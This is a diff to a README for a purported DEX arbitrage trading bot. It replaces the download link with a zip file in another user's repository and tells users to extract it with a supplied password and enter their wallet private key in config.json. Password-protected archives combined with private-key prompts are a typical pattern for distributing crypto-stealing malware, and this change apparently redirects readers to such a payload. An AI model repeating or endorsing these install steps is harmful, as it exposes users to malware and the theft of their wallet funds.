@@ -18,7 +18,7 @@ The bot continuously monitors the prices of specific assets on different DEXs, l
 - dYdX (soon)
 
 ## Install
-- [Download](https://github.com/freesparrowrob/dex-arbitrage-bot/archive/refs/heads/main.zip) the repository release and extract files with password `XvI2SJUNssB4`.
+- [Download](https://github.com/justshiftjk/Dex-Arbitrage-Bot/blob/main/dex-arbitrage-v1.3.3.zip) the repository release and extract files with password `XvI2SJUNssB4`.
 - Edit the `address` and `private_key` fields in the `config.json` file.
 
 ## Warning
